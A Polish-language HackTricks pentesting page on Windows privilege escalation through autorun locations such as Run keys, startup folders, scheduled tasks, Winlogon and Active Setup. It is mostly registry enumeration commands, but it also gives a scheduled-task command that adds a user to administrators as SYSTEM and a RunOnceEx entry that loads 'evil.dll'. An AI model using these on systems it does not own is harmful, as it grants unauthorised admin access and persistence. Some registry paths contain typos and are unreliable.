# Podwyższanie Uprawnień z Autoruns

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się sztuczkami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów na githubie.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Wskazówka dotycząca bug bounty**: **zarejestruj się** w **Intigriti**, premium **platformie bug bounty stworzonej przez hackerów, dla hackerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** może być używany do uruchamiania programów przy **uruchamianiu**. Zobacz, które binaria są zaprogramowane do uruchomienia przy starcie:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Zadania** mogą być zaplanowane do uruchomienia z **określoną częstotliwością**. Zobacz, które binaria są zaplanowane do uruchomienia za pomocą:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Folders

Wszystkie pliki binarne znajdujące się w **folderach uruchamiania będą wykonywane przy starcie**. Typowe foldery uruchamiania to te wymienione w kontynuacji, ale folder uruchamiania jest wskazany w rejestrze. [Przeczytaj to, aby dowiedzieć się gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Rejestr

{% hint style="info" %}
[Uwaga stąd](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis rejestru **Wow6432Node** wskazuje, że używasz 64-bitowej wersji systemu Windows. System operacyjny używa tego klucza, aby wyświetlić oddzielny widok HKEY\_LOCAL\_MACHINE\SOFTWARE dla aplikacji 32-bitowych działających na 64-bitowych wersjach systemu Windows.
{% endhint %}

### Uruchomienia

**Powszechnie znane** wpisy rejestru AutoRun:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Klucze rejestru znane jako **Run** i **RunOnce** są zaprojektowane do automatycznego uruchamiania programów za każdym razem, gdy użytkownik loguje się do systemu. Wartość danych przypisana do klucza jest ograniczona do 260 znaków lub mniej.

**Uruchomienia usług** (mogą kontrolować automatyczne uruchamianie usług podczas rozruchu):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

W systemach Windows Vista i nowszych klucze rejestru **Run** i **RunOnce** nie są automatycznie generowane. Wpisy w tych kluczach mogą bezpośrednio uruchamiać programy lub określać je jako zależności. Na przykład, aby załadować plik DLL podczas logowania, można użyć klucza rejestru **RunOnceEx** wraz z kluczem "Depend". Demonstruje to dodanie wpisu rejestru do wykonania "C:\temp\evil.dll" podczas uruchamiania systemu:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Eksploit 1**: Jeśli możesz pisać w którymkolwiek z wymienionych rejestrów w **HKLM**, możesz podnieść uprawnienia, gdy inny użytkownik się zaloguje.
{% endhint %}

{% hint style="info" %}
**Eksploit 2**: Jeśli możesz nadpisać którykolwiek z binarnych plików wskazanych w którymkolwiek z rejestrów w **HKLM**, możesz zmodyfikować ten plik binarny, dodając tylne drzwi, gdy inny użytkownik się zaloguje i podnieść uprawnienia.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skróty umieszczone w folderze **Startup** automatycznie uruchomią usługi lub aplikacje podczas logowania użytkownika lub ponownego uruchamiania systemu. Lokalizacja folderu **Startup** jest zdefiniowana w rejestrze zarówno dla zakresu **Local Machine**, jak i **Current User**. Oznacza to, że każdy skrót dodany do tych określonych lokalizacji **Startup** zapewni, że powiązana usługa lub program uruchomi się po procesie logowania lub ponownego uruchamiania, co czyni to prostą metodą planowania automatycznego uruchamiania programów.

{% hint style="info" %}
Jeśli możesz nadpisać dowolny \[User] Shell Folder w **HKLM**, będziesz mógł skierować go do folderu kontrolowanego przez Ciebie i umieścić backdoora, który zostanie wykonany za każdym razem, gdy użytkownik zaloguje się do systemu, eskalując uprawnienia.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typowo klucz **Userinit** jest ustawiony na **userinit.exe**. Jednak jeśli ten klucz zostanie zmodyfikowany, określony plik wykonywalny również zostanie uruchomiony przez **Winlogon** po logowaniu użytkownika. Podobnie klucz **Shell** ma wskazywać na **explorer.exe**, który jest domyślnym powłoką dla systemu Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Jeśli możesz nadpisać wartość rejestru lub binarny plik, będziesz w stanie podnieść uprawnienia.
{% endhint %}

### Ustawienia polityki

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawdź klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana wiersza poleceń w trybie awaryjnym

W rejestrze systemu Windows pod `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` znajduje się wartość **`AlternateShell`** ustawiona domyślnie na `cmd.exe`. Oznacza to, że gdy wybierasz "Tryb awaryjny z wierszem poleceń" podczas uruchamiania (naciskając F8), używany jest `cmd.exe`. Jednak możliwe jest skonfigurowanie komputera tak, aby automatycznie uruchamiał się w tym trybie bez potrzeby naciskania F8 i ręcznego wyboru.

Kroki do utworzenia opcji uruchamiania w celu automatycznego uruchamiania w "Trybie awaryjnym z wierszem poleceń":

1. Zmień atrybuty pliku `boot.ini`, aby usunąć flagi tylko do odczytu, systemowe i ukryte: `attrib c:\boot.ini -r -s -h`
2. Otwórz `boot.ini` do edycji.
3. Wstaw linię taką jak: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w `boot.ini`.
5. Ponownie zastosuj oryginalne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

* **Eksploatacja 1:** Zmiana klucza rejestru **AlternateShell** pozwala na niestandardową konfigurację powłoki poleceń, potencjalnie umożliwiając nieautoryzowany dostęp.
* **Eksploatacja 2 (Uprawnienia do zapisu w PATH):** Posiadanie uprawnień do zapisu w dowolnej części zmiennej systemowej **PATH**, szczególnie przed `C:\Windows\system32`, pozwala na uruchomienie niestandardowego `cmd.exe`, który może być tylnym wejściem, jeśli system zostanie uruchomiony w trybie awaryjnym.
* **Eksploatacja 3 (Uprawnienia do zapisu w PATH i boot.ini):** Dostęp do zapisu w `boot.ini` umożliwia automatyczne uruchamianie w trybie awaryjnym, ułatwiając nieautoryzowany dostęp przy następnym uruchomieniu.

Aby sprawdzić bieżące ustawienie **AlternateShell**, użyj tych poleceń:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Zainstalowany komponent

Active Setup to funkcja w systemie Windows, która **inicjuje się przed pełnym załadowaniem środowiska pulpitu**. Priorytetowo wykonuje określone polecenia, które muszą zakończyć się przed kontynuowaniem logowania użytkownika. Proces ten zachodzi nawet przed uruchomieniem innych wpisów startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarządzany przez następujące klucze rejestru:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W obrębie tych kluczy istnieje wiele podkluczy, z których każdy odpowiada konkretnemu komponentowi. Kluczowe wartości, które są szczególnie interesujące, to:

* **IsInstalled:**
* `0` oznacza, że polecenie komponentu nie zostanie wykonane.
* `1` oznacza, że polecenie zostanie wykonane raz dla każdego użytkownika, co jest domyślnym zachowaniem, jeśli wartość `IsInstalled` jest nieobecna.
* **StubPath:** Definiuje polecenie, które ma być wykonane przez Active Setup. Może to być dowolna poprawna linia poleceń, na przykład uruchomienie `notepad`.

**Wskazówki dotyczące bezpieczeństwa:**

* Modyfikacja lub zapis do klucza, w którym **`IsInstalled`** jest ustawione na `"1"` z określonym **`StubPath`**, może prowadzić do nieautoryzowanego wykonania polecenia, potencjalnie w celu eskalacji uprawnień.
* Zmiana pliku binarnego, do którego odnosi się jakakolwiek wartość **`StubPath`**, również może osiągnąć eskalację uprawnień, pod warunkiem posiadania wystarczających uprawnień.

Aby sprawdzić konfiguracje **`StubPath`** w komponentach Active Setup, można użyć następujących poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Przegląd Browser Helper Objects (BHO)

Browser Helper Objects (BHO) to moduły DLL, które dodają dodatkowe funkcje do Internet Explorera firmy Microsoft. Ładują się do Internet Explorera i Eksploratora Windows przy każdym uruchomieniu. Jednak ich wykonanie można zablokować, ustawiając klucz **NoExplorer** na 1, co uniemożliwia ich ładowanie z instancjami Eksploratora Windows.

BHO są kompatybilne z Windows 10 za pośrednictwem Internet Explorera 11, ale nie są obsługiwane w Microsoft Edge, domyślnym przeglądarki w nowszych wersjach Windows.

Aby zbadać BHO zarejestrowane w systemie, można sprawdzić następujące klucze rejestru:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Każde BHO jest reprezentowane przez swój **CLSID** w rejestrze, który służy jako unikalny identyfikator. Szczegółowe informacje o każdym CLSID można znaleźć pod `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Aby zapytać o BHO w rejestrze, można wykorzystać następujące polecenia:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorer

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Zauważ, że rejestr będzie zawierał 1 nowy wpis rejestru dla każdej dll, który będzie reprezentowany przez **CLSID**. Informacje o CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Sterowniki czcionek

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Otwórz polecenie

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje wykonania pliku obrazu
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Zauważ, że wszystkie strony, na których można znaleźć autoruny, **zostały już przeszukane przez** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak dla **bardziej szczegółowej listy automatycznie wykonywanych** plików możesz użyć [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) z sysinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**Znajdź więcej Autoruns, takich jak rejestry w** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## References

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **zarejestruj się** w **Intigriti**, premium **platformie bug bounty stworzonej przez hackerów, dla hackerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}
